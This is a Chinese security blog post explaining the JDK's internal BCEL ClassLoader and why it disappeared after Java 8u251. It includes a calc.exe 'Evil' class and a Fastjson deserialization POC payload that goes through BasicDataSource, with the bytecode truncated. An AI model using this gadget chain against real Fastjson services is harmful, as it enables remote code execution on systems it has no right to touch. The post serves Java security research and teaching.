

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>BCEL ClassLoader去哪了 | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">BCEL ClassLoader去哪了</h1>
            <div class="details-up">
  <span class="author">作者: phithon</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2020-10-26 11:48</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">5条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="where-is-bcel-classloader.html">66045人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/bcel.html">bcel</a>
    
        <a href="../tag/java%E5%AE%89%E5%85%A8.html">java安全</a>
    
  </span>
  
</div>
            <div class="entry">
                <p><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>是常常在构造漏洞利用POC时用到的类。但是，我前几天在写《<a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a>》的时候，偶然发现我环境中的<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>类找不到了，本文就带大家来找找BCEL ClassLoader。</p>
<h2 id="0x01-bcel"><a class="toclink" href="#0x01-bcel">0x01 BCEL从哪里来</a></h2>
<p>首先，BCEL究竟是什么？它为什么会出现在JDK中？</p>
<p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。Apache Commons大家应该不陌生，反序列化最著名的利用链就是出自于其另一个子项目——Apache Commons Collections。</p>
<p>BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。</p>
<p>就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>。</p>
<p>据我（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能。准确的来说，Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中。</p>
<p>JAXP全名是<a href="https://zh.wikipedia.org/wiki/JAXP">Java API for XML Processing</a>，他是Java定义的一系列接口，用于处理XML相关的逻辑，包括DOM、SAX、StAX、XSLT等。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler。</p>
<p>XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</p>
<p>XSLTC Compiler就是一个命令行编译器，可以将一个xsl文件编译成一个class文件或jar文件，编译后的class被称为translet，可以在后续用于对XML文件的转换。其实就将XSLT的功能转化成了Java代码，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程。</p>
<p>我们尝试用本地的Java（注意需要用Java7或6，使用8将会出现异常）来编译一下hello.xsl：</p>
<div class="codehilite"><pre><span></span><code><span class="err">java com.sun.org.apache.xalan.internal.xsltc.cmdline.Compile hello.xsl</span>
</code></pre></div>


<p><a href="../media/attachment/2020/10/26/ec9d4904-f8a2-4e20-b26c-3e8793f58232.png"><img alt="image-20201026092136332.png" src="../media/attachment/2020/10/26/ec9d4904-f8a2-4e20-b26c-3e8793f58232.00f1a1ee8633.png" /></a></p>
<p>可见，从<code>hello.xsl</code>生成了<code>hello.class</code>，反编译这个class即可看到源代码。</p>
<p>不知道大家看到这个代码里的<code>AbstractTranslet</code>会不会有点眼熟？我们在反序列化时常用的另一个类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，它在<code>defineClass</code>中需要的字节码所对应的基类，就是这里的<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。</p>
<p>其实Java里很多东西是有因果的，<code>TemplatesImpl</code>是对JAXP标准中<code>javax.xml.transform.Templates</code>接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么<code>TemplatesImpl</code>会使用<code>defineClass</code>的原因。</p>
<p>关于XSLT这块的内容比较多，不是本文的重点，我就不细说了。那么这部分内容和BCEL有什么关系呢？</p>
<p>你应该也能猜到了，因为需要“编译”XSL文件，实际上核心是动态生成Java字节码，而BCEL正是一个处理字节码的库，所以Apache Xalan是依赖BCEL的。</p>
<h2 id="0x02-bcel-classloader"><a class="toclink" href="#0x02-bcel-classloader">0x02 BCEL ClassLoader如何使用</a></h2>
<p>BCEL这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个ClassLoader，但是他重写了Java内置的<code>ClassLoader#loadClass()</code>方法。</p>
<p>在<code>ClassLoader#loadClass()</code>中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。具体算法在这里：</p>
<div class="codehilite"><pre><span></span><code>  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">JavaWriter</span> <span class="kd">extends</span> <span class="n">FilterWriter</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="nf">JavaWriter</span><span class="p">(</span><span class="n">Writer</span> <span class="n">out</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">super</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="n">isJavaIdentifierPart</span><span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">b</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">b</span> <span class="o">!=</span> <span class="n">ESCAPE_CHAR</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">ESCAPE_CHAR</span><span class="p">);</span> <span class="c1">// Escape character</span>

        <span class="c1">// Special escape</span>
        <span class="k">if</span><span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="n">FREE_CHARS</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">CHAR_MAP</span><span class="o">[</span><span class="n">b</span><span class="o">]</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// Normal escape</span>
          <span class="kt">char</span><span class="o">[]</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">.</span><span class="na">toHexString</span><span class="p">(</span><span class="n">b</span><span class="p">).</span><span class="na">toCharArray</span><span class="p">();</span>

          <span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="sc">&#39;0&#39;</span><span class="p">);</span>
            <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">tmp</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">);</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">tmp</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">);</span>
            <span class="n">out</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">tmp</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">);</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">write</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">cbuf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">off</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="p">{</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">write</span><span class="p">(</span><span class="n">cbuf</span><span class="o">[</span><span class="n">off</span> <span class="o">+</span> <span class="n">i</span><span class="o">]</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">write</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="kt">int</span> <span class="n">off</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="p">{</span>
      <span class="n">write</span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">toCharArray</span><span class="p">(),</span> <span class="n">off</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div>


<p>基本可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。默认情况下外层还会加一层GZip压缩。</p>
<p>我们可以编写一个恶意类Evil：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">package</span> <span class="nn">org.vulhub.fastjson</span><span class="p">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Evil</span> <span class="p">{</span>
    <span class="kd">static</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;calc.exe&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


<p>然后将Evil生成BCEL形式的字节码。使用这个字节码来新建对象，将会调用到计算器：</p>
<p><a href="../media/attachment/2020/10/26/eb519358-e81c-4736-a805-4eef97e4a5bb.png"><img alt="image-20201026105509619.png" src="../media/attachment/2020/10/26/eb519358-e81c-4736-a805-4eef97e4a5bb.87530ab6e56f.png" /></a></p>
<h2 id="0x03-bcelfastjson"><a class="toclink" href="#0x03-bcelfastjson">0x03 BCEL在Fastjson漏洞中的利用</a></h2>
<p>前文介绍了BCEL的来历和用法，那么在实际攻防对抗中，我们是如何认识BCEL的呢？</p>
<p>这就得追溯到Fastjson的反序列化漏洞了。当年Fastjson反序列化漏洞出现后，网络上广泛流传的利用链有下面三个：</p>
<ul>
<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
<li><code>com.sun.rowset.JdbcRowSetImpl</code></li>
<li><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></li>
</ul>
<p>第一个利用链是常规的Java字节码的执行，但是需要开启<code>Feature.SupportNonPublicField</code>，比较鸡肋；第二个利用链用到的是JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，在目标没外网的情况下无法直接利用；第三个利用链也是一个字节码的利用，但其无需目标额外开启选项，也不用连接外部服务器，利用条件更低。</p>
<p><code>BasicDataSource</code>的利用原理可以参考这篇文章<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a>，本文也仅做一个简单的描述。</p>
<p><code>BasicDataSource</code>的<code>toString()</code>方法会遍历这个类的所有getter并执行，于是通过<code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()</code>的调用关系，调用到了<code>createConnectionFactory</code>方法：</p>
<div class="codehilite"><pre><span></span><code>    <span class="kd">protected</span> <span class="n">ConnectionFactory</span> <span class="nf">createConnectionFactory</span><span class="p">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="p">{</span>
        <span class="c1">// Load the JDBC driver class</span>
        <span class="n">Driver</span> <span class="n">driverToUse</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">driver</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">driverToUse</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">driverClassName</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="k">try</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">driverClassLoader</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">driverClassName</span><span class="p">);</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                            <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span>
                                    <span class="n">driverClassName</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="n">driverClassLoader</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="p">...</span>
</code></pre></div>


<p>在<code>createConnectionFactory</code>方法中，调用了<code>Class.forName(driverClassName, true, driverClassLoader)</code>。有读过我的《Java安全漫谈》第一篇文章的同学应该对<code>Class.forName</code>还有印象，第二个参数<code>initial</code>为true时，类加载后将会直接执行<code>static{}</code>块中的代码。</p>
<p>因为<code>driverClassLoader</code>和<code>driverClassName</code>都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可。</p>
<p>BCEL ClassLoader闪亮登场。第二章中我们已经演示过<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>是如何加载字节码并执行命令的，这里只是将前文的<code>loadClass</code>变成了<code>Class.forName</code>。</p>
<p>综上，我们可以构造一个Fastjson的POC：</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span>
    <span class="err">{</span>
        <span class="nt">&quot;aaa&quot;</span><span class="p">:</span> <span class="p">{</span>
                <span class="nt">&quot;@type&quot;</span><span class="p">:</span> <span class="s2">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="p">,</span>
                <span class="nt">&quot;driverClassLoader&quot;</span><span class="p">:</span> <span class="p">{</span>
                    <span class="nt">&quot;@type&quot;</span><span class="p">:</span> <span class="s2">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>
                <span class="p">},</span>
                <span class="nt">&quot;driverClassName&quot;</span><span class="p">:</span> <span class="s2">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="err">:</span> <span class="s2">&quot;bbb&quot;</span>
<span class="err">}</span>
</code></pre></div>


<p>触发反序列化命令执行：</p>
<p><a href="../media/attachment/2020/10/26/8cc61a15-41e5-46d3-ad12-d7a18987d9ef.png"><img alt="image-20201026110614113.png" src="../media/attachment/2020/10/26/8cc61a15-41e5-46d3-ad12-d7a18987d9ef.e41eead2546b.png" /></a></p>
<h2 id="0x04-bcel"><a class="toclink" href="#0x04-bcel">0x04 BCEL去哪了</a></h2>
<p>同样的代码，如果在Java 8u261下执行，则会出现一个异常：</p>
<p><a href="../media/attachment/2020/10/26/64c99b73-eece-447c-9d69-682d0a82baa5.png"><img alt="image-20201026110925187.png" src="../media/attachment/2020/10/26/64c99b73-eece-447c-9d69-682d0a82baa5.593c717e742c.png" /></a></p>
<p>查看原因，发现是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>这个类不在了，查看源码确实没有了。</p>
<p>翻一下Java的更新日志，可以发现在8u251的时候，曾有过一个BCEL相关的更新：<a href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html">https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html</a></p>
<p><a href="../media/attachment/2020/10/26/ecdd1f4f-3967-4edd-81ca-ccb2ba139aec.png"><img alt="image-20201026111119095.png" src="../media/attachment/2020/10/26/ecdd1f4f-3967-4edd-81ca-ccb2ba139aec.6d589284a80b.png" /></a></p>
<p>点issue可以发现其创建于2016年8月，但是在2020年才被正式修改。他的描述是：</p>
<blockquote>
<p>BCEL 6.0 has been released at Apache Commons on 7/16/, refer to the common page: <a href="https://commons.apache.org/proper/commons-bcel/">https://commons.apache.org/proper/commons-bcel/</a> and release notes: <a href="https://archive.apache.org/dist/commons/bcel/RELEASE-NOTES.txt">https://archive.apache.org/dist/commons/bcel/RELEASE-NOTES.txt</a></p>
<p>We should evaluate and upgrade to the latest release from the current version 5.2 in the JDK.</p>
</blockquote>
<p>其实就是把BCEL的依赖升级到6.0了。难道是BCEL 6.0之后这个ClassLoader被删除了吗？</p>
<p>我登录<a href="https://commons.apache.org/proper/commons-bcel/">Apache Commons BCEL官网</a>，下载了多个6.x的代码，发现ClassLoader都是存在的：</p>
<p><a href="../media/attachment/2020/10/26/30d097c0-ee94-483f-bac0-735b8a91f5ed.png"><img alt="image-20201026111850509.png" src="../media/attachment/2020/10/26/30d097c0-ee94-483f-bac0-735b8a91f5ed.900fc45488bc.png" /></a></p>
<p>这就十分奇怪了。</p>
<p>不过，我在BCEL的Issue中找到了这么一个：<a href="https://issues.apache.org/jira/browse/BCEL-110">https://issues.apache.org/jira/browse/BCEL-110</a></p>
<p>其修复方法就是简单粗暴地删除了<code>src/main/java/org/apache/commons/bcel6/util/ClassLoader.java</code>：</p>
<p><a href="../media/attachment/2020/10/26/a00497f4-8c0e-48bf-a520-8545c83ca98c.png"><img alt="image-20201026112330562.png" src="../media/attachment/2020/10/26/a00497f4-8c0e-48bf-a520-8545c83ca98c.edf56ebf70dd.png" /></a></p>
<p>但是，为什么在官网下载的源码包中又存在这个类呢？我继而又翻到了两个有趣的提交：</p>
<p><a href="../media/attachment/2020/10/26/d3b7c4ee-2171-4cd8-bb28-8c53f8097ca9.png"><img alt="image-20201026113426341.png" src="../media/attachment/2020/10/26/d3b7c4ee-2171-4cd8-bb28-8c53f8097ca9.2bda6e1c347c.png" /></a></p>
<p>在2015年的时候，曾有过这么一个issue：<a href="https://issues.apache.org/jira/browse/BCEL-222">https://issues.apache.org/jira/browse/BCEL-222</a>，提出修改bcel命名空间为bcel6。但是在2016年6月，又将所有的修改全部改了回去。</p>
<p>这时注意了，仔细查看之前的ClassLoader.java被删除的那条记录你会发现，删除的时候是在2015年8月，且目录中的文件夹名字是bcel6。也就是说，刚好是被改后的这段时间，然而因为2016年那次的revert ，这个改动也被撤回了……</p>
<p>所以你在官网里下载的BCEL中，ClassLoader是存在的。</p>
<p>那么为什么Java内的ClassLoader没有了呢？我觉得只有两个可能性：</p>
<ul>
<li>Java在升级BCEL的时候注意到了前面那个issue，并参考它的修复方式重新将ClassLoader删除了</li>
<li>Java将BCEL升级到6.0时用的是一个删除了ClassLoader版本的BCEL（但无法解释为何命名空间不是bcel6）</li>
</ul>
<p>所以，很遗憾，在Java 8u251以后，BCEL这个安全人员的好伙伴就此离家出走了，不知道何时会归来。所以，之后测试fastjson反序列化，记得这里有个坑。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://docs.oracle.com/javase/tutorial/jaxp/index.html">https://docs.oracle.com/javase/tutorial/jaxp/index.html</a></li>
<li><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></li>
<li><a href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html">https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html</a></li>
</ul>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/bcel.html">bcel</a>
                
                    <a href="../tag/java%E5%AE%89%E5%85%A8.html">java安全</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 5 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-3702">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">yzmm</a></div>
                    <p>这里有个小瑕疵，即便是用到了BCEL6也没用，因为BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了，如下：<br><br>/**<br>* @param bytes the raw bytes of this Utf-8<br>* @deprecated (since 6.0)<br>*/<br>@java.lang.Deprecated<br>public final void setBytes( final String bytes ) {<br>  throw new UnsupportedOperationException();<br>}</p>
                    <span class="comment-time">时间: 2021-10-21 16:43</span>
                    <span class="comment-reply"><a href="#comment-3702" onclick="reply_to('3702','yzmm')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3682">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">P神粉丝</a></div>
                    <p>Classloader在15年9月就恢复到了主代码：https://github.com/apache/commons-bcel/commit/6e08c112527e45080ff99c6bb1ae4bd2165d292a，但是不清楚Oracle为什么不跟。</p>
                    <span class="comment-time">时间: 2021-08-20 17:37</span>
                    <span class="comment-reply"><a href="#comment-3682" onclick="reply_to('3682','P神粉丝')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3583">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/69f6d48aa271db33d6f7de165dde2281.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">中标查询</a></div>
                    <p>没有用过  但是博客很详细</p>
                    <span class="comment-time">时间: 2020-11-30 17:43</span>
                    <span class="comment-reply"><a href="#comment-3583" onclick="reply_to('3583','中标查询')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3569">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/ab18692a14d8aeb965ea8b0c3dae285b.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="http://ii.sy" target="_blank" rel="nofollow noopener">博主的</a></div>
                    <p>博主 请问这款主题如何伪静态设置</p>
                    <span class="comment-time">时间: 2020-11-09 18:29</span>
                    <span class="comment-reply"><a href="#comment-3569" onclick="reply_to('3569','博主的')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3575">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
                    <p>@博主的 博客后端是我自己写的并没有开源。主题来源于hexo，具体hexo怎么设置伪静态我也不太清楚。</p>
                    <span class="comment-time">时间: 2020-11-16 16:33</span>
                    <span class="comment-reply"><a href="#comment-3575" onclick="reply_to('3575','phithon')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="d546482b3cd3af20b3d4206e89260395d075b479" />
</div><div class="col-6">
<img src="../captcha/image/d546482b3cd3af20b3d4206e89260395d075b479/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="458" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="esFuSJZO2rIPRciffepLMjpuUdGoa0Mt003lqOAxqNWypK6DhfmwJMszfAXzJCYL">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
